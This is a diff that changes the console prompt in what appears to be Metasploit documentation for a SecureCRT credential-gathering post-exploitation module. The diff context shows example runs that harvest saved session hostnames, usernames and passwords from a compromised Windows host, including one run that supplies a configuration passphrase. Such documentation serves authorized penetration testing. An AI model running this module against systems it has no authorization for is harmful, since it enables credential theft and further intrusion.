@@ -73,8 +73,8 @@ information even if a portable version of SecureCRT is utilized on the target.
 
 ### Windows Server 2019 Standard Edition with SecureCRT v8.7.3 Build 2279 (Configuration Password Enabled)
 ```
-msf6 exploit(multi/handler) > use post/windows/gather/credentials/securecrt
-msf6 post(windows/gather/credentials/securecrt) > info
+msf exploit(multi/handler) > use post/windows/gather/credentials/securecrt
+msf post(windows/gather/credentials/securecrt) > info
 
        Name: Windows SecureCRT Session Information Enumeration
      Module: post/windows/gather/credentials/securecrt
@@ -107,11 +107,11 @@ Description:
 References:
   https://github.com/HyperSine/how-does-SecureCRT-encrypt-password/blob/master/doc/how-does-SecureCRT-encrypt-password.md
 
-msf6 post(windows/gather/credentials/securecrt) > set SESSION 1
+msf post(windows/gather/credentials/securecrt) > set SESSION 1
 SESSION => 1
-msf6 post(windows/gather/credentials/securecrt) > set Passphrase whatabadpassword
+msf post(windows/gather/credentials/securecrt) > set Passphrase whatabadpassword
 Passphrase => whatabadpassword
-msf6 post(windows/gather/credentials/securecrt) > run
+msf post(windows/gather/credentials/securecrt) > run
 
 [*] Gathering SecureCRT session information from WIN-M5JU6L5RA9L
 [*] Searching for session files in C:\Users\normal\AppData\Roaming\VanDyke\Config\Sessions
@@ -125,13 +125,13 @@ Filename           Protocol  Hostname   Port  Username              Password
 127.0.0.1 (3).ini  ssh2      127.0.0.1  22    Administrator
 127.0.0.1.ini      telnet    127.0.0.1  23
 
-msf6 post(windows/gather/credentials/securecrt) >
+msf post(windows/gather/credentials/securecrt) >
 ```
 
 ### Windows Server 2019 Standard Edition with SecureCRT v8.7.3 Build 2279 (Configuration Password Enabled, But No Password Provided)
 ```
-msf6 exploit(multi/handler) > use post/windows/gather/credentials/securecrt
-msf6 post(windows/gather/credentials/securecrt) > info
+msf exploit(multi/handler) > use post/windows/gather/credentials/securecrt
+msf post(windows/gather/credentials/securecrt) > info
 
        Name: Windows SecureCRT Session Information Enumeration
      Module: post/windows/gather/credentials/securecrt
@@ -164,9 +164,9 @@ Description:
 References:
   https://github.com/HyperSine/how-does-SecureCRT-encrypt-password/blob/master/doc/how-does-SecureCRT-encrypt-password.md
 
-msf6 post(windows/gather/credentials/securecrt) > set SESSION 1
+msf post(windows/gather/credentials/securecrt) > set SESSION 1
 SESSION => 1
-msf6 post(windows/gather/credentials/securecrt) > run
+msf post(windows/gather/credentials/securecrt) > run
 
 [*] Gathering SecureCRT session information from WIN-M5JU6L5RA9L
 [*] Searching for session files in C:\Users\Administrator\AppData\Roaming\VanDyke\Config\Sessions
@@ -181,5 +181,5 @@ Filename       Hostname   Port  Username              Password
 
 [+] Session info stored in: /home/gwillcox/.msf4/loot/20200911125521_default_172.20.150.24_host.securecrt_s_951139.txt
 [*] Post module execution completed
-msf6 post(windows/gather/credentials/securecrt) >
+msf post(windows/gather/credentials/securecrt) >
 ```
